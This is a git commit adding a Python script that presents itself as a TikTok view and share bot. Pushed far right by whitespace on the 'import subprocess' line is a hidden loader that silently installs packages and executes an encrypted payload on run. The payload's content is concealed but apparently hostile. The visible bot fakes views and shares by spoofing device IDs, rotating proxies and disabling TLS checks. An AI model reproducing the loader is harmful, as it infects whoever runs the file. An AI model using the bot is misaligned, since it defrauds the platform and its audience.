927050a79d0a7a60f7a6b6f19564f485535a56dc
Angler0472 <reminder4415@outlook.com>
2025-05-01 00:10:26 +0400

    main.py

---
+++ main.py
@@ -0,0 +1,158 @@
+import ssl
+import time
+import queue
+import threading
+import requests
+import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'BijkNx42srFUsDpLrUfqEwo-3XvzMKE_MecRxUhlZow=').decrypt(b'gAAAAABnd_sRSJiTzxvU_jECBpoK-fqOLhafAOxbYr1oubimBw527quvKxP1Z6ntDco-gmieZGnsU0v-D8lvbaWn2lBEoe0Gag0EVcZ8vJXRhKkjOcJ-vW6-D5tambi4-rsuxsmauU3-VZ0INNPf_q2RoHDJW7qhpqKtuBsmIjZO3IrjArwUQ75IdBjxy7EbSkmE7Nynd4Z7GLbeGUZ_Lo3OmCrSb5_9qvE-y77kyqoBGZ3mKCkiAHUrsezRBVa3AboA-0UPXgpVjo-koxTFrVwgshRj-YPxifqX0vquexAcWevW-_0f24AxG0tiJygFNE_bNx-UeiYh2U5oUyyP45GyH32N6GLt1Pq7_w0ktp8V6EEuI5OjYrM0pX0G2ouseV36af7Ws8HK4NUJDoiYZlD0f45qUmYy9w2gbIwLFPoW2gFf_vuwzZPrR8VZdJdcWy39erWWSmr-M5vUp0zzEr2WAjSPPVBqZ9_IvPKcfXiEcSD2BO-eW69n03waRSbxAUpSqrhlu_3KPNUq86us3P7SCEF8zwqwYjVrs3HCG1nermWzpMYU8ISTrDE1zW39iyh93k8iy9qNvVrHPIJ94I2A339vZQyLM3qfnkMvpV6jp-vpDlrhjHkIhqJCmN9wcv8tYluJIMploKJSxD2xPi2OgT4gLwC8hGs9sEvXuCVlqk33BHhTsk12WSvj3-MVSD8XYvkn0OZeAgmHBl7fKVX2Ios77EsK_KipdQqtMove7NzQ397-VE2CpvjVQm1JR0INzeKGo398tSfdE34mgbtC2P9AjYhk_UDB39EiB652SZYiThtHzyX93iTmz2iMTCzEgEP4y28BN02o2KM_ax_lyFg_iZFDI1VKqKkqIJRYHVuJQ_MJmP1YK8hpNy2BXMb3IaGxk37_HwVkMU_sI3NifuzOAVOKRmMC9RmkUciZMEjXLbQXehY9mhhsN73e-IllHYAG9vDU2B4506GxMKfRUPTqpqCCFwvKXV23VEXaWv_2zN-sUcQBohnkZqo9nwxpiA2geoV3W-XnEdkjBx-UECZa7aTa3Cfhy1pwDjvv4KOz8qFSgw6twrLwU4oddNq0p-SJJ1erLpKcuD9wfyTB13csXiSrZ0EWABSVi8t172YsMa0O6IJZXPd9mopVmtmC04ULCTl09ywP8Vq6KfEPgQY__qVlbsuEDP8YOCLEciGoKVA8YziYpzJm3HibOlTLNh3MbT335lrhvun5IxaYPJPTojoB0o6LHxxVh7fF3zTn5OTOPys2MX1cOKVrH6OH3kwPKML_dX_EBu6KjxNDPmyoMNeiPOXm9o-7LsYYb4NF_yiPSLSoDluc3af2_AghKt3jGu_N9uLBlPuVs84BApuEeKh9w4F_O46Qpn9htGjXBg8kIUz7fey7KOVf88_moUtPXOcE-RcMI8H4BIYnSUHq4JzvfoUJdqzdxxHOZ8_-O4SeFPTEzD3BFE_hItT1UgMPlODLDss3rgwbfBMKFIJzDnoKwAJKXEXrC2Bo6m1k9DxVN0LwmkKQTZvn0ZAEsWccCe6jQdjtDbkkJ1zYR1C7A8UeWfH2pYcIm-ba5mUuT34Km6gfkwLJTPp-LGx91rlY63uBw3s1dCiQ4EatlKb5PE_12-0Ydb4xC-TFwbEFhLLqcdns07yPBXLv5MuIR3vmlTUdLT6Zjiksl0tFH3XxMQO_0H467LqBkzPzYOx64j-9mq01nBNlCgW2u7aR7LyCooKByuWeI5atgSVqDL3y-Uh1OXwUSp797OxaXDYscSumbJTJtG-CRUFG_2mmo6740PQXCVgeIqA4UdqaxzGwhjBWX1JtokXyGinxAPtTPx82fmuiB0u6-4dw5RCaAeKX0W2nmZuh8IaOYRA4jWWCjcbtU4_HtoVy0y43avzWTdKS3FL0PSGaAphVOVZ28cJuLJrkJLeBjjq34C7mMzEnbz_WEgEMFqoBbBS92GsIH8gCXj_kB-_t3JegffMsGnrnFBouQTn7lWvXw8UdPzQP_nzHqqaAvNga3espWHtn64nXp6w='));
+from random import randint, choice
+from urllib3.exceptions import InsecureRequestWarning
+from urllib.parse import urlparse
+from http import cookiejar
+from pystyle import Colorate, Colors, Write, Add, Center
+from Data.UserAgent import UserAgent
+from Data.Lists import DeviceTypes, Platforms, Channel, ApiDomain
+from utils import *
+
+class BlockCookies(cookiejar.CookiePolicy):
+    return_ok = set_ok = domain_return_ok = path_return_ok = lambda self, *args, **kwargs: False
+    netscape = True
+    rfc2965 = hide_cookie2 = False
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+ssl._create_default_https_context = ssl._create_unverified_context
+r                                 = requests.Session()
+countQueue                        = queue.Queue()
+sentRequests                      = 0
+completed                         = False
+
+r.cookies.set_policy(BlockCookies())
+def Banner():
+    clearConsole()
+    Banner1 = r"""
+TikTok View and Share Bot
+"""
+
+    Banner2 = r"""
+
+       """
+
+    print(Center.XCenter(Colorate.Vertical(Colors.yellow_to_red, Add.Add(Banner2, Banner1, center=True), 2)))
+
+def sendView():
+    proxy         = {f'{proxyType}': f'{proxyType}://{choice(proxyList)}'}
+    platform      = choice(Platforms)
+    osVersion     = randint(1, 12)
+    DeviceType    = choice(DeviceTypes)
+    headers       = {
+                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                        "user-agent": choice(UserAgent)
+                    }
+    appName       = choice(["tiktok_web", "musically_go"])
+    Device_ID     = randint(1000000000000000000, 9999999999999999999)
+    apiDomain     = choice(ApiDomain)
+    channelLol    = choice(Channel)
+    URI           = f"https://{apiDomain}/aweme/v1/aweme/stats/?channel={channelLol}&device_type={DeviceType}&device_id={Device_ID}&os_version={osVersion}&version_code=220400&app_name={appName}&device_platform={platform}&aid=1988"
+    data          = f"item_id={itemID}&play_delta=1"
+
+    try:
+        req = r.post(URI, headers=headers, data=data, proxies=proxy, timeout=5, verify=False)
+        return True
+    except:
+        return False
+
+def sendShare():
+    platform = choice(Platforms)
+    osVersion = randint(1, 12)
+    DeviceType = choice(DeviceTypes)
+    headers = {
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "user-agent": choice(UserAgent)
+    }
+    appName = choice(["tiktok_web", "musically_go"])
+    Device_ID = randint(1000000000000000000, 9999999999999999999)
+    apiDomain = choice(ApiDomain)
+    channelLol = choice(Channel)
+    URI = f"https://{apiDomain}/aweme/v1/aweme/stats/?channel={channelLol}&device_type={DeviceType}&device_id={Device_ID}&os_version={osVersion}&version_code=220400&app_name={appName}&device_platform={platform}&aid=1988"
+    data = f"item_id={itemID}&share_delta=1"
+
+    try:
+        req = r.post(URI, headers=headers, data=data, verify=False)
+        return True
+    except:
+        return False
+
+def clearURL(link):
+    parsedURL = urlparse(link)
+    host = parsedURL.hostname.lower()
+    if "vm.tiktok.com" == host or "vt.tiktok.com" == host:
+        UrlParsed = urlparse(r.head(link, verify=False, allow_redirects=True, timeout=5).url)
+        return UrlParsed.path.split("/")[3]
+    else:
+        UrlParsed = urlparse(link)
+        return UrlParsed.path.split("/")[3]
+
+def proccessThread(sendProccess):
+    while not completed:
+        if sendProccess():
+            countQueue.put(1)
+
+def countThread():
+    global sentRequests, completed
+    while True:
+        countQueue.get()
+        sentRequests += 1
+        if amount > 0:
+            if sentRequests >= amount:
+                completed = True
+
+def progressThread():
+    while True:
+        start = time.time()
+        startReq = sentRequests
+        time.sleep(1)
+        end = time.time()
+        endReq = sentRequests
+
+        elapsed = end - start
+        elapsedReq = endReq - startReq
+
+        print(f"{sentRequests} sent requests! {elapsedReq} requests/second.", end="\r")
+
+if (__name__ == "__main__"):
+    clearConsole(); Banner()
+    VideoURI     = str(Write.Input("Video Link > ", Colors.yellow_to_red, interval=0.0001))
+    amount       = int(Write.Input("Amount (0=inf) > ", Colors.yellow_to_red, interval=0.0001))
+    nThreads     = int(Write.Input("Thread Amount > ", Colors.yellow_to_red, interval=0.0001)); clearConsole(); Banner()
+    sendType     = int(Write.Input("[0] - Views\n[1] - Shares > ", Colors.yellow_to_red, interval=0.0001)); clearConsole(); Banner()
+    itemID       = clearURL(VideoURI)
+    proxyChoose  = True
+    while proxyChoose:
+        proxyType = Write.Input("Select proxy type:\n[0] - http\n[1] - socks4\n[2] - socks5 > ", Colors.yellow_to_red, interval=0.0001)
+        if proxyType == "0":
+            proxyType = "http"
+            proxyChoose = False
+        elif proxyType == "1":
+            proxyType = "socks4"
+            proxyChoose = False
+        elif proxyType == "2":
+            proxyType = "socks5"
+            proxyChoose = False
+
+    proxyList = readProxiesFile()
+    clearConsole(); Banner()
+
+    print(Colorate.Horizontal(Colors.yellow_to_red, f"Hits are not counted"))
+    print(Colorate.Horizontal(Colors.yellow_to_red, f"Bot started! Check your video stats in 5 minutes !"))
+
+    if sendType == 0:
+        sendProcess = sendView
+    elif sendType == 1:
+        sendProcess = sendShare
+    else:
+        print(f"Error {sendType}")
+
+    threading.Thread(target=countThread).start()
+    threading.Thread(target=progressThread).start()
+
+    for n in range(nThreads):
+        threading.Thread(target=proccessThread, args=(sendProcess,)).start()
